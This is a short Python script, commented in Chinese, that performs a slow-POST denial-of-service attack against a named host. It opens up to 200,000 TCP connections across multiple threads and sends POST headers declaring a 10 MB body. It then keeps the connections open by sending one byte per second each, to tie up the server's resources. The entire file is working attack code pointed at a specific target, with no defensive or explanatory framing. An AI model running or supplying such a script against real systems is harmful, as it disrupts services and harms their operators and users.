import socket
import time
import threading

MAX_CONN = 200000  # 最大连接数
PORT = 80
HOST = "s3.antx.cc"  # 目标IP或域名.
PAGE = "/#/classlist"  # 目标页面

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"  # 实体数据大小
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):  # MAX_CONN允许最大连接数
        # AF_INET 表示 IPv4 地址，创建 TCP套接字，必须使用 SOCK_STREAM 作为套接字类型
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            print("[+] 成功发送buf!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] 无法连接服务器或发送错误:%s" % ex)
            # 暂停1秒

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("[-] 发送异常:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)


# 建立多线程
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
# 开启线程
conn_th.start()
send_th.start()

conn_th2 = threading.Thread(target=conn_thread, args=())
send_th2 = threading.Thread(target=send_thread, args=())
conn_th2.start()